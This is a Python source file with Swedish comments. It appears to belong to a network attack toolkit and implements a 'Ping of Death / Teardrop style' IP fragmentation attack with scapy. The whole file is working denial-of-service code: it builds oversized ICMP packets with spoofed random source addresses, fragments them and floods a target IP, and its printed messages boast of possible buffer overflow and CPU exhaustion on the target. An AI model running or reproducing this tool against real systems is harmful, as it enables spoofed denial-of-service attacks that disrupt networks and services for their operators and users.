"""
IP Fragmentation Attack (Ping of Death / Teardrop style)
Skickar fragmenterade paket som inte kan reassembleras
"""
from scapy.all import IP, ICMP, Raw, fragment
import time
from .base_attack import BaseAttack
from utils.network_utils import generate_random_ip


class FragmentationAttack(BaseAttack):
    """IP Fragmentation - Skickar felaktiga fragmenterade paket"""

    def get_attack_name(self):
        return "Fragmentation Attack"

    def execute(self, count=100):
        """Kör fragmentation attack"""
        self.print_header("IP Fragmentation Attack (Ping of Death style)", count=count)

        print("[*] Skickar stora fragmenterade ICMP-paket")
        print("[*] Kan orsaka buffer overflow eller DoS på äldre system")

        self.start_time = time.time()
        self.packets_sent = 0

        for i in range(count):
            fake_source = generate_random_ip()

            # Skapa ett stort ICMP-paket (> MTU)
            large_payload = (f"{self.custom_message}_FRAG_{i + 1}_" * 200).encode()

            # Skapa baspacket
            base_packet = IP(src=fake_source, dst=self.target_ip) / \
                          ICMP() / \
                          Raw(load=large_payload)

            # Fragmentera paketet (varje fragment blir ett paket)
            fragments = fragment(base_packet, fragsize=800)

            # Skicka alla fragment
            for frag in fragments:
                self.send_packet(frag)

            if (i + 1) % 20 == 0:
                elapsed = time.time() - self.start_time
                pps = self.packets_sent / elapsed if elapsed > 0 else 0
                print(f"[+] Frag: {i + 1}/{count} stora paket fragmenterade ({pps:.1f} pps)")
                print(f"    → {len(fragments)} fragment per paket")

        self.log_attack("FRAGMENTATION",
                        f"{count} fragmented packets, message: {self.custom_message}")
        self.print_summary()

        print("\n[!] Varje paket fragmenteras i flera delar")
        print("[!] Tvingar target att reassemblera = CPU-last")

